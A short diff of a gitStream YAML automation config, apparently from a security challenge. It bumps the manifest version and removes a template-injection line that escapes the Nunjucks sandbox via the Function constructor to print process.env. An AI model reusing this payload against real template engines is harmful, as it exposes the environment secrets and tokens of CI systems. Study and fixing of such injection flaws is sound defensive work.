@@ -1,7 +1,7 @@
 # -*- mode: yaml -*-
 
 manifest:
-  version: 1.0
+  version: 1.1
 
 automations:
   gitstream-challenge-16-3-gold:
@@ -31,5 +31,5 @@ automations:
           args:
             comment: |
               {{ branch | estimatedReviewTime < 5 }}
-              {{ "".sub.constructor("console.log(process.env);")() }}
+
               
